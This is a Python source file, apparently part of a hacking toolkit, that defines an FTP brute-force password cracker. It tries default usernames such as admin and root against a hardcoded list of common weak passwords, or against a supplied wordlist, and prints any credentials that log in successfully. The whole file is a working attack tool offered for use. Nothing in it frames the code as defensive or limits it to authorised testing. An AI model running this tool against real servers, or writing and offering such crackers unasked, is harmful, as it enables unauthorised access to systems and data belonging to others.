from TheSilent.clear import *

import ftplib

cyan = "\033[1;36m"

password_list = ["admin","administrator","password","root","support","123456","qwerty","12345678","qwerty123","1234567","1234567890","DEFAULT","000000","iloveyou","qwertyuiop","654321","123456a","dragon","1qaz2wsx","123qwe","7777777","123","zxcvbnm","123abc","555555","qwerty1","222222","asdfghjkl","123123123","target123","tinkle","159753","1234qwer","computer","michael","11111111","aaaaaa","ashley","789456123","999999","shadow","iloveyou1","123456789a","888888","qwer1234","fuckyou1","azerty","q1w2e3r4","baseball","princess1","asd123","asdasd","soccer"]

#attempts to crack an ftp servers password
def ftp_cracker(url, word_list = " "):
    clear()
    global password_list

    user_list = ["admin", "administrator", "root", "support"]

    if word_list != " ":
        for user in user_list:
            with open(word_list, "r") as f:
                for i in f:
                    key = i.replace("\n", "")
            
                    try:
                        ftp = ftplib.FTP(url, timeout = 15)
                        ftp.login(user, key)

                        clear()
                        
                        print(cyan + "True: " + user + ":" + key)
                        break

                    except:
                        print(cyan + "False: " + user + ":" + key)

    if word_list == " ":
        for user in user_list:
            for key in password_list: 
                try:
                    ftp = ftplib.FTP(url, timeout = 15)
                    ftp.login(user, key)

                    clear()
                    
                    print(cyan + "True: " + user + ":" + key)
                    break

                except:
                    print(cyan + "False: " + user + ":" + key)
